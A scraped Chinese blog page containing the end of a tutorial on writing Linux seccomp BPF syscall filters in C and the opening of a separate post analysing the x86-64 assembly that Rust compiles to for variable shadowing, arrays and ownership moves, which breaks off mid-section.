<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct seccomp_data - the format the BPF program executes over.</span></span><br><span class="line"><span class="comment"> * @nr: the system call number</span></span><br><span class="line"><span class="comment"> * @arch: indicates system call convention as an AUDIT_ARCH_* value</span></span><br><span class="line"><span class="comment"> *        as defined in &lt;linux/audit.h&gt;.</span></span><br><span class="line"><span class="comment"> * @instruction_pointer: at the time of the system call.</span></span><br><span class="line"><span class="comment"> * @args: up to 6 system call arguments always stored as 64-bit values</span></span><br><span class="line"><span class="comment"> *        regardless of the architecture.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> nr;</span><br><span class="line">	__u32 arch;</span><br><span class="line">	__u64 instruction_pointer;</span><br><span class="line">	__u64 args[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面这段代码定义了一些编写seccomp BPF code可能会用到的东西，根据注释可知，我们可以在BPF code中获取该系统调用的：系统调用号、处理器架构、指令地址、6个参数的值。具体选择获取什么通过字段k来决定，k相当于<code>seccomp_data</code>结构体的偏移量，若指定<code>k=0</code>，则为获取<code>nr</code>，即系统调用号，若<code>k=4</code>，则为获取处理器架构等。</p>
<p>我们以一个实例对seccomp BPF code进行理解，尝试通过机器码恢复code本身。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  LD | ABS | Word, R0 = arch</span><br><span class="line"> 0001: 0x15 0x00 0x19 0xc000003e  JMP | JEQ after 0x19, R0 == AUDIT_ARCH_X86_64 ?</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  LD | ABS | Word, R0 = nr</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  JMP | JGE after 0x01, R0 &gt;= 0x40000000 ?</span><br><span class="line"> 0004: 0x15 0x00 0x16 0xffffffff  JMP | JEQ after 0x16, R0 == 0xFFFFFFFF ?</span><br><span class="line"> 0005: 0x15 0x15 0x00 0x00000000  JMP | JEQ after 0x15, R0 == 0 ?</span><br><span class="line"> 0006: 0x15 0x14 0x00 0x00000001  JMP | JEQ after 0x14, R0 == 1 ?</span><br><span class="line"> 0007: 0x15 0x13 0x00 0x00000002  JMP | JEQ after 0x13, R0 == 2 ?</span><br><span class="line"> ...</span><br><span class="line"> 0026: 0x06 0x00 0x00 0x7fff0000  return SECCOMP_RET_ALLOW</span><br><span class="line"> 0027: 0x06 0x00 0x00 0x00000000  return SECCOMP_RET_KILL</span><br></pre></td></tr></table></figure>
<p>注意第二行的K字段，这里的K指的是<code>AUDIT_ARCH_X86_64</code>，定义于<code>/include/uapi/linux/audit.h</code>，其中为所有架构都定义了独特的标识符，而0xc000003e则是<code>AUDIT_ARCH_X86_64</code>的值。对于整个seccomp code而言，可能需要的外部数据也就只有<code>seccomp_data</code>了。</p>
<p>下面，我们就来通过一些具体的程序示例巩固一下我们的学习成果，使用seccomp BPF code完成自定义的filter规则。</p>
<h2 id="实例"><a class="markdownIt-Anchor" href="#实例"></a> 实例</h2>
<h3 id="task-01"><a class="markdownIt-Anchor" href="#task-01"></a> Task 01</h3>
<p>实现seccomp BPF filter，过滤x86-64之外所有架构的所有系统调用，过滤execve。</p>
<p>实现代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_STMT(BPF_ALU | BPF_K | BPF_SUB, <span class="number">59</span>),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">    system(<span class="string">&quot;echo HELLO&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码实现了对处理器架构与execve的检查，使用了一个<code>ALU</code>类型指令将系统调用号减去59，随后与0相比较。</p>
<p>对于seccomp BPF code而言，使用一个寄存器实际上已经足够了，对于多个返回值，我们可以在BPF code的最后几行进行统一定义，在编写前面的代码时，由于跳转指令的数量不确定，有时可能需要预留跳转数，在code编写完成后再进行计算。而对于seccomp的多个检查，我们完全可以将code除了返回之外的所有代码分片看待，每一片都进行一个检查，不同分片之间互不影响，每个分片中只使用一个寄存器即可完成检查，因此总的seccomp BPF code也只需要一个寄存器即可实现，这就使得我们不需要了解所有的BPF指令即可完美编写seccomp BPF filter。</p>
<p>在加载seccomp规则之前，代码中还执行了一次<code>prctl</code>。这里引用<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273495.htm#msg_header_h1_2">参考资料</a>：</p>
<blockquote>
<p>PR_SET_NO_NEW_PRIVS()：是在Linux 3.5 之后引入的特性，当一个进程或者子进程设置了PR_SET_NO_NEW_PRIVS 属性,则其不能访问一些无法共享的操作，如setuid、chroot等。配置seccomp-BPF的程序必须拥有Capabilities 中 的CAP_SYS_ADMIN，或者程序已经定义了no_new_privs属性。 若不这样做 非 root 用户使用该程序时 seccomp保护将会失效，设置了 PR_SET_NO_NEW_PRIVS 位后能保证 seccomp 对所有用户都能起作用</p>
</blockquote>
<h3 id="task-02"><a class="markdownIt-Anchor" href="#task-02"></a> Task 02</h3>
<p>实现seccomp BPF filter，过滤x86-64之外所有架构的所有系统调用，不允许第一个参数为3的read系统调用。</p>
<p>实现代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, arch)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, AUDIT_ARCH_X86_64, <span class="number">0</span>, <span class="number">5</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, args[<span class="number">0</span>])),</span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sock_filter)),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/bin/ls&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, fd);</span><br><span class="line">    read(fd, buffer, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意<code>BPF_JUMP</code>宏定义的使用，后面的2个参数分别表示条件成立时跳过前面几条指令，条件不成立时跳过前面几条指令。在上面的代码中，首先判断处理器架构，如果不是x86_64则跳转到<code>KILL</code>，随后首先判断系统调用号是不是3，不是则跳转到<code>ALLOW</code>，是则继续执行，判断第一个参数是不是3，如果是则跳转到<code>KILL</code>。</p>
<h1 id="0x03-总结"><a class="markdownIt-Anchor" href="#0x03-总结"></a> 0x03. 总结</h1>
<p>本文简要分析了seccomp添加规则的流程，以及seccomp BPF的编写方法。</p>
<p>在后面的文章中，我们将尝试尽可能分析CTF pwn题中所有与seccomp有关的绕过姿势，并通过具体的示例进行学习。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/27/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">Rust逆向学习 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-27 18:18:15" itemprop="dateCreated datePublished" datetime="2023-10-27T18:18:15+08:00">2023-10-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-29 15:07:13" itemprop="dateModified" datetime="2023-10-29T15:07:13+08:00">2023-10-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在本文中，我们将跟随《Rust权威指南》的学习路线，继续进行Rust逆向的学习。</p>
<p>前两篇文章中，我们对猜数字这个程序进行了详细的逆向分析，学习了Rust元组、枚举类型、控制结构、函数调用规则等基础的Rust汇编语言层结构。本文将针对第3章——通用编程概念与第4章——认识所有权的部分内容，对书中提到的Rust特性进行逆向分析。一方面学习逆向，另一方面深入理解Rust语言本身。</p>
<h1 id="reverse-for-shadow"><a class="markdownIt-Anchor" href="#reverse-for-shadow"></a> Reverse for Shadow</h1>
<p>Rust逆向中有一个“隐藏”（Shadow）的概念。它指的是一个变量可以多次被<code>let</code>关键字修饰，第二次通过<code>let</code>关键字定义变量可以改变原变量的类型，或改变原变量的值。如书中的示例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>()&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x * <span class="number">2</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此通过<code>let</code>关键字改变变量，与直接将变量用<code>mut</code>关键字声明的区别是可以在改变变量值的情况下保证变量的不可变性，还能够修改变量的类型。那么对于汇编语言层而言，在不改变变量类型的情况下，shadow特性是否会修改变量的保存位置？如果修改了变量类型，Rust又会将新的变量保存到什么位置呢？</p>
<h2 id="0x01-变量类型不修改"><a class="markdownIt-Anchor" href="#0x01-变量类型不修改"></a> 0x01. 变量类型不修改</h2>
<p>在没有修改变量类型的情况下，我们使用下面的代码示例进行测试：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x); </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = x + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>, x, y); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里每行语句的内容以及顺序是笔者通过调试选择的。</p>
<p>如果没有第一句<code>println!</code>语句，5这个值将会被保存到<code>eax</code>之中而不是一开始保存到内存，随后首先计算5+2将7保存到内存中某个位置。然后代码中通过<code>mov eax, 5</code>再将5赋值给x，计算5+1将6保存到内存中另一个位置。这是Rust编译器优化的结果，减少了内存交互。</p>
<p>而如果将第一个<code>println!</code>语句加上，情况则大不相同。因为根据我们前面文章的分析，<code>println!</code>需要首先获取若干个指针将第一个参数字符串中的中括号内容进行替换，因此在执行第一句<code>println!</code>前，<code>x</code>这个值必须要被保存到内存之中。使用网站编译后获取的部分汇编代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     dword ptr [rsp + 12], 5</span><br><span class="line">        lea     rax, [rsp + 12]</span><br><span class="line">        mov     qword ptr [rsp + 200], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for i32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 208], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 200]</span><br><span class="line">        mov     rax, qword ptr [rsp + 208]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        add     eax, 2</span><br><span class="line">        mov     dword ptr [rsp + 8], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 8]</span><br><span class="line">        mov     dword ptr [rsp + 80], eax</span><br><span class="line">        mov     eax, dword ptr [rsp + 12]</span><br><span class="line">        inc     eax</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_4</span><br><span class="line">        jmp     .LBB1_3</span><br></pre></td></tr></table></figure>
<p>可以看到，5这个值首先被保存到了<code>[rsp+12]</code>这个地方。在输出后从这个地方取出值，+2，保存到<code>[rsp+8]</code>作为y。下面的<code>seto</code>指令指的是如果该指令执行时将溢出标志位（OF）的值保存到唯一一个操作数，也就是<code>al</code>中，这个主要是为了检查整数运算是否产生了数值溢出。</p>
<p>最后一部分，可以看到<code>eax</code>取出<code>[rsp+12]</code>这个地址的内容，+1，再保存到了另外一个地址空间<code>[rsp+4]</code>中。也就是说，这里Rust编译器选择不复用原来的内存空间，即使原来的内存空间在正常情况下已经不会再被访问。这造成了4字节的内存空间浪费。上述的代码是以无优化模式进行编译，没有进行优化。</p>
<p>不过当笔者在编译选项中添加<code>-C opt-level=3</code>，即最高级别优化时，具体的汇编代码虽然有所不同，原先的整数计算将不再进行溢出检查，但是<code>x</code>在shadow之后依然被保存到了不同的内存空间之中。</p>
<h2 id="0x02-变量类型修改"><a class="markdownIt-Anchor" href="#0x02-变量类型修改"></a> 0x02. 变量类型修改</h2>
<p>当变量类型修改时，有三种情况可能产生：新的变量类型占用的内存空间大小不变或更大或更小。</p>
<p>将上一节Rust代码中第二次使用<code>let</code>关键字定义的变量<code>x</code>从<code>i32</code>类型改变为<code>u32</code>类型，最终保存变量的内存空间排布与上一节完全相同，唯一不同的是溢出检查变成了<code>setb</code>命令，这个命令相当于是将进位/借位标志位赋值给寄存器，也就是检查无符号整数溢出的。</p>
<p>将上一节中的shadow变量<code>x</code>从<code>i32</code>类型改为<code>i16</code>类型，即将变量占用的内存空间变小，最终的结果依然是不会复用。改为<code>i64</code>类型也是如此。</p>
<p>由此可以得出结论：<strong>Rust中一个变量将另一个变量隐藏后，无论新的变量类型是什么，都不会使用原来的变量内存空间保存新的变量。</strong></p>
<p>另外，当旧值为一个对象实例时，隐藏旧值后旧值将会自动删除。</p>
<p>经过思考，笔者认为Rust编译器这样做的原因是：有的时候一个变量将另一个变量隐藏时，新赋的值可能需要旧值参与运算。如果旧值为指针，那么此时新值不可能复用旧值的内存空间，旧值需要在新值赋值运算进行过程中一直保持不变，因此不复用内存空间在编译器设计上反而是最为简单的。另外，旧值在被隐藏后生命周期不会立即结束，针对其的引用依然能够使用，不过如果其所有权没有被夺走，隐藏后就无法获取其所有权了。</p>
<h1 id="reverse-for-array"><a class="markdownIt-Anchor" href="#reverse-for-array"></a> Reverse for Array</h1>
<p>Rust语言中有数组结构，对于数组的定义，Rust有较为方便的定义方式。当需要连续多个相同的值到相邻的数组索引时，可以使用分号定义，如<code>[5;5]</code>即为长度为5，5个索引值全为5的数组。</p>
<p>下面是<code>let x = [5; 10]</code>的反编译：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        xor     eax, eax</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">.LBB0_1:</span><br><span class="line">        mov     rax, qword ptr [rsp - 48]</span><br><span class="line">        mov     qword ptr [rsp - 56], rax</span><br><span class="line">        cmp     rax, 10</span><br><span class="line">        jae     .LBB0_3</span><br><span class="line">        mov     rax, qword ptr [rsp - 56]</span><br><span class="line">        mov     dword ptr [rsp + 4*rax - 40], 5</span><br><span class="line">        add     rax, 1</span><br><span class="line">        mov     qword ptr [rsp - 48], rax</span><br><span class="line">        jmp     .LBB0_1</span><br><span class="line">.LBB0_3:</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到这里使用了一个循环结构来为各个索引赋值，而且经过测试发现，即使分号后面是2，Rust也会使用循环来定义。当优化等级为最高时，Rust编译器会通过<code>xmmword</code>赋值，一次可以赋值4个索引16个字节的内容。</p>
<h1 id="reverse-for-moving"><a class="markdownIt-Anchor" href="#reverse-for-moving"></a> Reverse for Moving</h1>
<p>对于一个对象实例，为防止其所有权被多个变量拥有，当另外一个变量尝试获取其所有权时，原先变量对其的所有权将被夺走。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码，逆向出来的结果比较有趣，往下看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 280</span><br><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     byte ptr [rsp + 231], 1</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br></pre></td></tr></table></figure>
<p>上面是第一行<code>from</code>函数的逆向，可以看到<code>from</code>函数实际传参用了三个寄存器，<code>rdi</code>为目的<code>String</code>实例指针，<code>rsi</code>为字符串字面量地址，<code>rdx</code>为字符串长度。可以看到这里<code>[rsp+16]</code>保存了<code>String</code>实例的栈地址，这也就是变量<code>x</code>的保存位置。</p>
<p>后面略过<code>println!</code>看第三行：</p>
